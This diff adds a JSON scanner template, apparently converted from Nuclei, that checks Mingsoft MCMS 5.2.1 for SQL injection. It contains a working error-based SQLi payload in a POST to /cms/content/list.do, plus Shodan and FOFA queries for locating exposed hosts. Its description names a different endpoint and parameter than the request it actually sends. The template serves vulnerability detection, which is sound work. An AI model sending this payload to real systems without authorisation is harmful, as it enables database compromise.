@@ -1,0 +1,136 @@
+{
+  "id": "mcms-list-sqli",
+  "name": "Mingsoft MCMS 5.2.1 - SQL Injection",
+  "author": "ritikchaddha",
+  "severity": "CRITICAL",
+  "description": "SQL injection vulnerability in Mingsoft MCMS 5.2.1 via the dictType parameter in /mdiy/dict/listExcludeApp.\n",
+  "references": [
+    "https://gitee.com/mingSoft/MCMS/issues/I8MAJK"
+  ],
+  "tags": [
+    "mingsoft",
+    "mcms",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "icon_hash\u003d\"1464851260\"",
+    "shodan": "http.favicon.hash:1464851260"
+  },
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-89,CWE-707",
+  "cvssScore": "9.8",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /cms/content/list.do HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ncategoryType\u003d1\u0026sqlWhere\u003d%5b%7b%22action%22%3a%22and%22%2c%22field%22%3a%22updatexml(1%2cconcat(0x7e%2cmd5({{num}})%2c0x7e)%2c1)%22%2c%22el%22%3a%22eq%22%2c%22model%22%3a%22contentTitle%22%2c%22name%22%3a%22%C3%A6%C2%96%C2%87%C3%A7%C2%AB%20%C3%A6%20%C2%87%C3%A9%C2%A2%C2%98%22%2c%22type%22%3a%22input%22%2c%22value%22%3a%22111%22%7d%5d\u0026pageNo\u003d1\u0026pageSize\u003d10\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "c8c605999f3d8352d7bb792cf3fdb25"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "mcms-list-sqli",
+    "info": {
+      "name": "Mingsoft MCMS 5.2.1 - SQL Injection",
+      "author": "ritikchaddha",
+      "severity": "critical",
+      "description": "SQL injection vulnerability in Mingsoft MCMS 5.2.1 via the dictType parameter in /mdiy/dict/listExcludeApp.\n",
+      "reference": [
+        "https://gitee.com/mingSoft/MCMS/issues/I8MAJK"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss_score": "9.8",
+        "cwe_id": "CWE-89,CWE-707"
+      },
+      "metadata": {
+        "max_request": 2,
+        "shodan_query": "http.favicon.hash:1464851260",
+        "fofa_query": "icon_hash\u003d\"1464851260\""
+      },
+      "tags": "mingsoft,mcms,sqli"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /cms/content/list.do HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ncategoryType\u003d1\u0026sqlWhere\u003d%5b%7b%22action%22%3a%22and%22%2c%22field%22%3a%22updatexml(1%2cconcat(0x7e%2cmd5({{num}})%2c0x7e)%2c1)%22%2c%22el%22%3a%22eq%22%2c%22model%22%3a%22contentTitle%22%2c%22name%22%3a%22%C3%A6%C2%96%C2%87%C3%A7%C2%AB%20%C3%A6%20%C2%87%C3%A9%C2%A2%C2%98%22%2c%22type%22%3a%22input%22%2c%22value%22%3a%22111%22%7d%5d\u0026pageNo\u003d1\u0026pageSize\u003d10\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "c8c605999f3d8352d7bb792cf3fdb25"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
